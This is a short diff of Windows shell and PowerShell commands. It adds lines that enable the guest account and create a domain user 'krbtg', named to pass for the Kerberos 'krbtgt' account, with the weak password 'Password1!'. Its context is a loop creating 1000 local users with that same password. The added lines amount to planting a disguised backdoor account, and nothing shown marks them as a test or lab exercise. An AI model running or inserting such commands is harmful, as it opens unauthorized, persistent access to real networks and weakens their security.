@@ -1,3 +1,7 @@
+net user guest /active:yes
+
+net user /add krbtg Password1! /domain
+
 for ($i = 0; $i -lt 1000; $i++) {
   New-LocalUser -Name "bob$i" -Password "Password1!" 
 }
